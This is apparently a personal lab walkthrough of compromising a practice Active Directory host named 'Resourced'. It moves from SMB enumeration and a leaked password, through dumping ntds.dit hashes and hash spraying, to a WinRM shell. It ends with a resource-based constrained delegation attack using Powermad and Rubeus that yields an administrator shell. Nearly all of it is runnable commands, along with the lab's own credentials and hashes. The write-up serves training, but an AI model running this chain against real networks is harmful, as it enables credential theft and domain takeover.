## Takeaway
## Metadata
- Running `enum4linux -U 192.168.213.175` will identify potential credential pair as `V.Ventz:HotelCalifornia194!`.![[Pasted image 20240324142136.png]]
- Run `netexec smb 192.168.213.175 -u "V.Ventz" -p "HotelCalifornia194!"  --shares` will identify an interesting share called `Password Audit`.![[Pasted image 20240324143159.png]]
	- Run `smbget "smb://192.168.213.175/Password Audit" --user "V.Ventz"%"HotelCalifornia194!" -R` to download all available files from share `Password Audit` for inspection.                                                             ![[Pasted image 20240324151047.png]] 
		- There are `ntds.dit`, `SECURITY`, and `SYSTEM`  file. Run `impacket-secretsdump -ntds ../Active\ Directory/ntds.dit -system SYSTEM LOCAL` to retrieve more user hashes.![[Pasted image 20240324151722.png]]
		- With more hashes, run `netexec smb 192.168.213.175 -u domain_users.txt -H hashes.txt --no-bruteforce --continue-on-success` to discover another pair of valid credential as `resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808`![[Pasted image 20240324152417.png]]
		- Run `netexec winrm 192.168.213.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808` will identify that the user have `winrm` access.![[Pasted image 20240324152729.png]]
- Running `bloodhound` as `L.Livingstone` will identify that it has `GenericAll` towards DC which mean one can user `Resources-based Constrained Delegation` to root the DC.![[Pasted image 20240324154624.png]]
# Exploitation
## Shell as L.Livingstone
- Run `evil-winrm -i 192.168.213.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808` to obtain a `winrm` session.
# PrivEsc
- Run the following lines to upload and load necessary scripts:
```shell
upload /home/saxon/Desktop/Windows/PowerView.ps1
upload /home/saxon/Desktop/Windows/Powermad.ps1
upload /home/saxon/Desktop/Windows/Rubeus.exe
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force
. .\PowerView.ps1;. .\Powermad.ps1
```

```shell
$TargetComputer = "RESOURCEDC.RESOURCED.LOCAL"
# add a new attacker-controlled computer account
New-MachineAccount -MachineAccount fakeComputer -Password $(ConvertTo-SecureString 'Hacker123!' -AsPlainText -Force)
# retrieve the security identifier (SID) of the newly created computer account
$ComputerSid = Get-DomainComputer fakeComputer -Properties objectsid | Select -Expand objectsid
# build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
# set newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
# use Rubeus to hash the plaintext password into its RC4_HMAC form
.\Rubeus.exe hash /password:Hacker123!
.\Rubeus.exe s4u /user:fakeComputer$ /rc4:9C19EE2F145CDA561679109001FC6B26 /impersonateuser:administrator /msdsspn:cifs/RESOURCEDC.RESOURCED.LOCAl /ptt
```

```shell
# Copy the base64 encode ticket to a file called `administrator_tgs_kirbi.base64` onto the attacker machine 
# Decode the kirbi
base64 -d administrator_tgs_kirbi.base64 > administrator_tgs_kirbi
# Convert to `.ccache` that psexec.py understands
ticketConverter.py administrator_tgs_kirbi administrator_tgs.ccache 
# The magic !!!!
KRB5CCNAME=administrator_tgs.ccache impacket-psexec resourced.local/administrator@RESOURCEDC.RESOURCED.LOCAL -k -no-pass
```